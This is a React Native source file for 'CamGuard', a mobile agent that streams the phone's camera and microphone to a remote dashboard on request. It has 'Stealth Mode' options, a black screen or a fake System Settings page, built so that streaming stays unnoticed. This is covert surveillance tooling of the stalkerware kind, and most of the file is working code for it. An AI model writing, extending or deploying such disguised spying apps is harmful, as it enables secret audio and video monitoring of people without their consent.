/**
 * ============================================
 * CamGuard Mobile - Main Application Component
 * ============================================
 *
 * Stealth Mode: The app can run as a black screen
 * or display a fake "System Settings" page to
 * remain inconspicuous while streaming.
 */

import React, { useState, useEffect, useRef, useCallback } from 'react';
import {
  View,
  Text,
  StyleSheet,
  TouchableOpacity,
  Switch,
  StatusBar,
  Vibration,
  Platform,
} from 'react-native';
import { SafeAreaView } from 'react-native-safe-area-context';
import SignalingService, { CameraType, SignalingCallbacks } from './services/SignalingService';
import foregroundServiceManager from './services/ForegroundServiceManager';
import { getDeviceId, getDeviceName } from './utils/deviceId';

type StealthMode = 'normal' | 'black' | 'fake-settings';
type ConnectionStatus = 'disconnected' | 'connecting' | 'connected' | 'streaming';

export default function App() {
  // ---- State ----
  const [connectionStatus, setConnectionStatus] = useState<ConnectionStatus>('disconnected');
  const [currentCamera, setCurrentCamera] = useState<CameraType>('front');
  const [stealthMode, setStealthMode] = useState<StealthMode>('normal');
  const [isServiceRunning, setIsServiceRunning] = useState(false);
  const [deviceId, setDeviceId] = useState<string>('');
  const [deviceName, setDeviceName] = useState<string>('');
  const [streamActive, setStreamActive] = useState(false);
  const [logMessages, setLogMessages] = useState<string[]>([]);

  // ---- Refs ----
  const signalingRef = useRef<SignalingService | null>(null);

  // ---- Logging ----
  const addLog = useCallback((message: string) => {
    const timestamp = new Date().toLocaleTimeString();
    setLogMessages((prev) => [`${timestamp}: ${message}`, ...prev].slice(0, 100));
  }, []);

  // ---- Signaling Callbacks (defined before initialize) ----

  const handleCameraSwitch = useCallback(async (camera: CameraType) => {
    addLog(`Switching camera to ${camera}`);
    const success = await signalingRef.current?.switchCamera(camera);
    if (success) {
      setCurrentCamera(camera);
      addLog(`Camera switched to ${camera}`);
      foregroundServiceManager.updateNotification(
        `Streaming - ${camera} camera`
      );
    }
  }, [addLog]);

  const handleStopStream = useCallback((reason?: string) => {
    addLog(`Stream stopped: ${reason || 'unknown'}`);
    signalingRef.current?.stopLocalStream();
    setStreamActive(false);
    setConnectionStatus('connected');
    foregroundServiceManager.updateNotification('Standby - waiting for connection');
  }, [addLog]);

  const handleDisconnected = useCallback(() => {
    setConnectionStatus('disconnected');
    setStreamActive(false);
  }, []);

  const handleError = useCallback((message: string) => {
    addLog(`Error: ${message}`);
  }, [addLog]);

  const handleStreamRequested = useCallback(async (viewerSocketId: string) => {
    addLog('Stream requested by dashboard');
    Vibration.vibrate(100); // Subtle vibration for notification

    // Start foreground service
    const serviceStarted = await foregroundServiceManager.start({
      text: 'Active streaming session',
    });
    setIsServiceRunning(serviceStarted);

    // Start local stream (use current camera state via ref approach)
    const sigService = signalingRef.current;
    if (!sigService) return;

    const streamStarted = await sigService.startLocalStream(sigService.getCurrentCamera());
    if (streamStarted) {
      setConnectionStatus('streaming');

      // Create WebRTC offer
      const offerSent = await sigService.createOffer(viewerSocketId);
      if (offerSent) {
        setStreamActive(true);
        const cam = sigService.getCurrentCamera();
        setCurrentCamera(cam);
        addLog(`Stream active (${cam} camera)`);
        foregroundServiceManager.updateNotification(
          `Streaming - ${cam} camera`
        );
      }
    }
  }, [addLog]);

  const handleStartStream = useCallback(async (viewerSocketId: string) => {
    addLog('Start stream requested');
    const sigService = signalingRef.current;
    if (!sigService) return;

    const streamStarted = await sigService.startLocalStream(sigService.getCurrentCamera());
    if (streamStarted) {
      const offerSent = await sigService.createOffer(viewerSocketId);
      if (offerSent) {
        setStreamActive(true);
        setConnectionStatus('streaming');
        setCurrentCamera(sigService.getCurrentCamera());
        addLog('Stream restarted');
      }
    }
  }, [addLog]);

  // ---- Initialize ----
  useEffect(() => {
    let cancelled = false;

    async function init() {
      try {
        const id = await getDeviceId();
        const name = getDeviceName();
        if (cancelled) return;

        // Create signaling service
        const callbacks: SignalingCallbacks = {
          onStreamRequested: handleStreamRequested,
          onSwitchCamera: handleCameraSwitch,
          onStopStream: handleStopStream,
          onStartStream: handleStartStream,
          onDisconnected: handleDisconnected,
          onError: handleError,
        };

        signalingRef.current = new SignalingService(id, name, callbacks);
        signalingRef.current.connect();
      } catch (error) {
        console.error('Init error:', error);
      }
    }

    init();

    return () => {
      cancelled = true;
      if (signalingRef.current) {
        signalingRef.current.cleanup();
      }
      foregroundServiceManager.stop();
      foregroundServiceManager.stopHeartbeat();
    };
  }, []);

  // ---- Manual Controls ----

  const handleToggleCamera = async () => {
    const newCamera = currentCamera === 'front' ? 'back' : 'front';
    await handleCameraSwitch(newCamera);
  };

  const handleToggleService = async () => {
    if (isServiceRunning) {
      foregroundServiceManager.stop();
      setIsServiceRunning(false);
      addLog('Foreground service stopped');
    } else {
      const started = await foregroundServiceManager.start({
        text: 'Standby - waiting for connection',
      });
      setIsServiceRunning(started);
      if (started) addLog('Foreground service started');
    }
  };

  const handleReconnect = () => {
    signalingRef.current?.cleanup();
    setConnectionStatus('disconnected');
    setStreamActive(false);

    const callbacks: SignalingCallbacks = {
      onStreamRequested: handleStreamRequested,
      onSwitchCamera: handleCameraSwitch,
      onStopStream: handleStopStream,
      onStartStream: handleStartStream,
      onDisconnected: handleDisconnected,
      onError: handleError,
    };

    signalingRef.current = new SignalingService(deviceId, deviceName, callbacks);
    signalingRef.current.connect();
    setConnectionStatus('connecting');
    addLog('Reconnecting...');
  };

  // ---- Stealth Mode ----

  const handleStealthModeChange = (mode: StealthMode) => {
    setStealthMode(mode);
    if (mode !== 'normal') {
      StatusBar.setHidden(mode === 'black', 'fade');
    } else {
      StatusBar.setHidden(false);
    }
  };

  // ---- Render: Fake System Settings (Stealth Mode) ----

  if (stealthMode === 'fake-settings') {
    return (
      <SafeAreaView style={styles.fakeSettingsContainer}>
        <StatusBar barStyle="dark-content" backgroundColor="#f5f5f5" />
        <View style={styles.fakeSettingsHeader}>
          <Text style={styles.fakeSettingsTitle}>Settings</Text>
        </View>
        <View style={styles.fakeSettingsContent}>
          {['Wi-Fi', 'Bluetooth', 'Mobile Data', 'Notifications', 'Battery', 'Storage', 'Display', 'Sound'].map(
            (item) => (
              <View key={item} style={styles.fakeSettingsItem}>
                <Text style={styles.fakeSettingsItemText}>{item}</Text>
                <Switch disabled value={item === 'Wi-Fi' || item === 'Notifications'} />
              </View>
            )
          )}
        </View>
        {/* Hidden tap area to exit stealth (tap version text 3 times) */}
        <View style={styles.fakeSettingsFooter}>
          <Text style={styles.fakeSettingsFooterText}>System Version 14.2.1</Text>
        </View>
      </SafeAreaView>
    );
  }

  // ---- Render: Black Screen (Stealth Mode) ----

  if (stealthMode === 'black') {
    return (
      <View style={styles.blackScreen}>
        <StatusBar hidden />
      </View>
    );
  }

  // ---- Render: Normal Mode (Main UI) ----

  return (
    <SafeAreaView style={styles.container}>
      <StatusBar barStyle="light-content" backgroundColor="#0a0a0a" />

      {/* Header */}
      <View style={styles.header}>
        <View>
          <Text style={styles.headerTitle}>CamGuard</Text>
          <Text style={styles.headerSubtitle}>Remote Camera Agent</Text>
        </View>
        <View style={styles.statusBadge}>
          <View
            style={[
              styles.statusDot,
              {
                backgroundColor:
                  connectionStatus === 'streaming'
                    ? '#22c55e'
                    : connectionStatus === 'connected'
                    ? '#3b82f6'
                    : connectionStatus === 'connecting'
                    ? '#eab308'
                    : '#ef4444',
              },
            ]}
          />
          <Text style={styles.statusText}>
            {connectionStatus === 'streaming'
              ? 'STREAMING'
              : connectionStatus === 'connected'
              ? 'CONNECTED'
              : connectionStatus === 'connecting'
              ? 'CONNECTING'
              : 'OFFLINE'}
          </Text>
        </View>
      </View>

      {/* Device Info */}
      <View style={styles.deviceInfoCard}>
        <Text style={styles.deviceInfoLabel}>Device</Text>
        <Text style={styles.deviceInfoValue}>{deviceName}</Text>
        <Text style={styles.deviceInfoId}>{deviceId.slice(0, 24)}...</Text>
      </View>

      {/* Controls */}
      <View style={styles.controlsSection}>
        <Text style={styles.sectionTitle}>Controls</Text>

        {/* Camera Toggle */}
        <View style={styles.controlRow}>
          <View style={styles.controlInfo}>
            <Text style={styles.controlLabel}>Camera</Text>
            <Text style={styles.controlValue}>{currentCamera === 'front' ? 'Front' : 'Back'}</Text>
          </View>
          <TouchableOpacity
            style={[styles.controlButton, { backgroundColor: '#1e3a5f' }]}
            onPress={handleToggleCamera}
            disabled={!streamActive}
          >
            <Text style={styles.controlButtonText}>
              Switch
            </Text>
          </TouchableOpacity>
        </View>

        {/* Foreground Service Toggle */}
        <View style={styles.controlRow}>
          <View style={styles.controlInfo}>
            <Text style={styles.controlLabel}>Background Service</Text>
            <Text style={styles.controlValue}>
              {isServiceRunning ? 'Active' : 'Inactive'}
            </Text>
          </View>
          <TouchableOpacity
            style={[
              styles.controlButton,
              { backgroundColor: isServiceRunning ? '#1e3a2f' : '#3a1e1e' },
            ]}
            onPress={handleToggleService}
          >
            <Text style={styles.controlButtonText}>
              {isServiceRunning ? 'Stop' : 'Start'}
            </Text>
          </TouchableOpacity>
        </View>

        {/* Reconnect */}
        <View style={styles.controlRow}>
          <View style={styles.controlInfo}>
            <Text style={styles.controlLabel}>Connection</Text>
            <Text style={styles.controlValue}>
              {connectionStatus === 'disconnected' ? 'Reconnect' : 'Connected'}
            </Text>
          </View>
          <TouchableOpacity
            style={[styles.controlButton, { backgroundColor: '#1e2a3a' }]}
            onPress={handleReconnect}
            disabled={connectionStatus === 'connected' || connectionStatus === 'streaming'}
          >
            <Text style={styles.controlButtonText}>Reconnect</Text>
          </TouchableOpacity>
        </View>
      </View>

      {/* Stealth Mode */}
      <View style={styles.controlsSection}>
        <Text style={styles.sectionTitle}>Stealth Mode</Text>
        <View style={styles.stealthOptions}>
          {[
            { mode: 'normal' as StealthMode, label: 'Normal', color: '#374151' },
            { mode: 'black' as StealthMode, label: 'Black Screen', color: '#111827' },
            { mode: 'fake-settings' as StealthMode, label: 'Fake Settings', color: '#1e293b' },
          ].map((option) => (
            <TouchableOpacity
              key={option.mode}
              style={[
                styles.stealthButton,
                {
                  backgroundColor:
                    stealthMode === option.mode ? '#2563eb' : option.color,
                  borderColor: stealthMode === option.mode ? '#3b82f6' : '#374151',
                },
              ]}
              onPress={() => handleStealthModeChange(option.mode)}
            >
              <Text style={styles.stealthButtonText}>{option.label}</Text>
            </TouchableOpacity>
          ))}
        </View>
      </View>

      {/* Stream Status */}
      <View style={styles.controlsSection}>
        <Text style={styles.sectionTitle}>Stream Status</Text>
        <View style={styles.streamStatusCard}>
          <View style={styles.streamStatusRow}>
            <View
              style={[
                styles.streamIndicator,
                { backgroundColor: streamActive ? '#22c55e' : '#374151' },
              ]}
            />
            <Text style={styles.streamStatusText}>
              {streamActive ? 'Camera & Mic Active' : 'Idle'}
            </Text>
          </View>
          <Text style={styles.streamCameraText}>
            {streamActive ? `${currentCamera === 'front' ? 'Front' : 'Back'} camera + audio` : 'Waiting for dashboard connection'}
          </Text>
        </View>
      </View>

      {/* Activity Log */}
      <View style={styles.controlsSection}>
        <View style={styles.logHeader}>
          <Text style={styles.sectionTitle}>Activity Log</Text>
          <TouchableOpacity onPress={() => setLogMessages([])}>
            <Text style={styles.logClearText}>Clear</Text>
          </TouchableOpacity>
        </View>
        <View style={styles.logContainer}>
          {logMessages.length === 0 ? (
            <Text style={styles.logEmpty}>No activity</Text>
          ) : (
            logMessages.slice(0, 20).map((msg, i) => (
              <Text key={i} style={styles.logText}>
                {msg}
              </Text>
            ))
          )}
        </View>
      </View>
    </SafeAreaView>
  );
}

// ---- Styles ----

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#0a0a0a',
    paddingHorizontal: 16,
  },
  header: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    paddingVertical: 16,
    borderBottomWidth: 1,
    borderBottomColor: '#1a1a1a',
  },
  headerTitle: {
    fontSize: 24,
    fontWeight: '700',
    color: '#ffffff',
  },
  headerSubtitle: {
    fontSize: 12,
    color: '#6b7280',
    marginTop: 2,
  },
  statusBadge: {
    flexDirection: 'row',
    alignItems: 'center',
    gap: 6,
    paddingHorizontal: 10,
    paddingVertical: 6,
    borderRadius: 20,
    backgroundColor: '#1a1a1a',
  },
  statusDot: {
    width: 8,
    height: 8,
    borderRadius: 4,
  },
  statusText: {
    fontSize: 11,
    fontWeight: '600',
    color: '#9ca3af',
    letterSpacing: 0.5,
  },
  deviceInfoCard: {
    backgroundColor: '#111111',
    borderRadius: 12,
    padding: 16,
    marginTop: 16,
    borderWidth: 1,
    borderColor: '#1f1f1f',
  },
  deviceInfoLabel: {
    fontSize: 11,
    color: '#6b7280',
    textTransform: 'uppercase',
    letterSpacing: 1,
  },
  deviceInfoValue: {
    fontSize: 16,
    fontWeight: '600',
    color: '#ffffff',
    marginTop: 4,
  },
  deviceInfoId: {
    fontSize: 11,
    color: '#4b5563',
    fontFamily: 'monospace',
    marginTop: 4,
  },
  controlsSection: {
    marginTop: 20,
  },
  sectionTitle: {
    fontSize: 13,
    fontWeight: '600',
    color: '#9ca3af',
    textTransform: 'uppercase',
    letterSpacing: 1,
    marginBottom: 10,
  },
  controlRow: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    backgroundColor: '#111111',
    borderRadius: 12,
    padding: 14,
    marginBottom: 8,
    borderWidth: 1,
    borderColor: '#1f1f1f',
  },
  controlInfo: {
    flex: 1,
  },
  controlLabel: {
    fontSize: 14,
    color: '#e5e7eb',
    fontWeight: '500',
  },
  controlValue: {
    fontSize: 12,
    color: '#6b7280',
    marginTop: 2,
  },
  controlButton: {
    paddingHorizontal: 16,
    paddingVertical: 8,
    borderRadius: 8,
  },
  controlButtonText: {
    fontSize: 13,
    fontWeight: '600',
    color: '#ffffff',
  },
  stealthOptions: {
    flexDirection: 'row',
    gap: 8,
  },
  stealthButton: {
    flex: 1,
    paddingVertical: 12,
    borderRadius: 10,
    alignItems: 'center',
    borderWidth: 1,
  },
  stealthButtonText: {
    fontSize: 12,
    fontWeight: '600',
    color: '#e5e7eb',
  },
  streamStatusCard: {
    backgroundColor: '#111111',
    borderRadius: 12,
    padding: 16,
    borderWidth: 1,
    borderColor: '#1f1f1f',
  },
  streamStatusRow: {
    flexDirection: 'row',
    alignItems: 'center',
    gap: 10,
  },
  streamIndicator: {
    width: 12,
    height: 12,
    borderRadius: 6,
  },
  streamStatusText: {
    fontSize: 14,
    fontWeight: '600',
    color: '#e5e7eb',
  },
  streamCameraText: {
    fontSize: 12,
    color: '#6b7280',
    marginTop: 6,
  },
  logHeader: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
  },
  logClearText: {
    fontSize: 12,
    color: '#6b7280',
  },
  logContainer: {
    backgroundColor: '#111111',
    borderRadius: 12,
    padding: 12,
    borderWidth: 1,
    borderColor: '#1f1f1f',
    maxHeight: 180,
  },
  logEmpty: {
    fontSize: 12,
    color: '#4b5563',
    textAlign: 'center',
    paddingVertical: 8,
  },
  logText: {
    fontSize: 10,
    color: '#6b7280',
    fontFamily: 'monospace',
    paddingVertical: 2,
  },

  // ---- Stealth Mode Styles ----
  blackScreen: {
    flex: 1,
    backgroundColor: '#000000',
  },
  fakeSettingsContainer: {
    flex: 1,
    backgroundColor: '#f5f5f5',
  },
  fakeSettingsHeader: {
    paddingHorizontal: 16,
    paddingVertical: 16,
    backgroundColor: '#ffffff',
    borderBottomWidth: 1,
    borderBottomColor: '#e5e5e5',
  },
  fakeSettingsTitle: {
    fontSize: 28,
    fontWeight: '700',
    color: '#000000',
  },
  fakeSettingsContent: {
    padding: 16,
  },
  fakeSettingsItem: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    paddingVertical: 14,
    paddingHorizontal: 16,
    backgroundColor: '#ffffff',
    borderRadius: 10,
    marginBottom: 8,
  },
  fakeSettingsItemText: {
    fontSize: 16,
    color: '#000000',
  },
  fakeSettingsFooter: {
    position: 'absolute',
    bottom: 20,
    left: 0,
    right: 0,
    alignItems: 'center',
  },
  fakeSettingsFooterText: {
    fontSize: 12,
    color: '#999999',
  },
});
